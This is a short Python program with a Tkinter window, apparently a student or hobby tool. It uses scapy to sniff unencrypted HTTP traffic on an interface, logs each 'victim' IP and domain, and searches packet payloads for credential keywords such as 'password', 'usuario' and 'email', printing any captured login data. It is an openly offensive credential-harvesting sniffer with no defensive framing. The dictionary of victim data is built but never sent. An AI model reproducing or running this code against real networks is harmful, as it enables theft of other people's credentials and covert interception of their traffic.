from tkinter import *
from tkinter import messagebox as MessageBox
from scapy.all import *
from scapy_http import http
import requests

ventana=Tk()
ventana.title("Captura de Paquetes")
ventana.config(width=250, height=200)

wordlist = ["email","username","user","usuario","password","passwd"]

CountImage = 10
Imagen = [PhotoImage(file='seg.gif',format = 'gif -index %i' %(i)) for i in range(CountImage)]

def captura_paquetes_http(packet):
	labelmac = Label(ventana, text= "Capturando Paquetes")
	labelmac.pack() 
	if packet.haslayer(http.HTTPRequest):
		print("[+] Victima: " + packet[IP].src + " IP DESTINO : " + packet[IP].dst + " DOMINIO : " + str(packet[http.HTTPRequest].Host))
		args = {'ip_victim': packet[IP].src, 'ip_destination': packet[IP].dst, 'domain': str(packet[http.HTTPRequest].Host)}
		
		if packet.haslayer(Raw):
			load = packet[Raw].load
			load = load.lower()
			for e in wordlist:
				if e in str(load):
					print(" DATO ENCONTRADO : " + str(load))
					args = {'ip_victim': packet[IP].src, 'ip_destination': packet[IP].dst, 'data': str(load), 'domain': str(packet[http.HTTPRequest].Host)}
					

def main():
	print("Capturando paquetes:")
	sniff(iface="eth0", store=False, prn=captura_paquetes_http)

def update(ind):

    imagen = Imagen[ind]
    ind += 2
    if ind == CountImage:
        ind = 0
    label.configure(image=imagen)
    ventana.after(100, update, ind)
label = Label(ventana)
label.place(x=30,y=80)
ventana.after(0, update, 0)

button = Button(ventana, text="Iniciar Captura",command=main).place(x=60,y=20)
if __name__ == '__main__':
	ventana.mainloop()